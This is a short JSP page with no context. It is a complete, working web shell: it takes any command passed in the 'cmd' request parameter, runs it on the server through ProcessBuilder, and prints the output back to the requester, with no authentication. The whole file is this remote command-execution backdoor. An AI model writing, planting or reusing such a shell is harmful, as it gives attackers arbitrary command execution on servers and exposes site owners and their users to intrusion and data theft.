<%@ page import="java.io.*, java.lang.ProcessBuilder" %>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));
        Process pr = pb.start();
        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            out.println(inputLine);
        }
        in.close();
    }
%>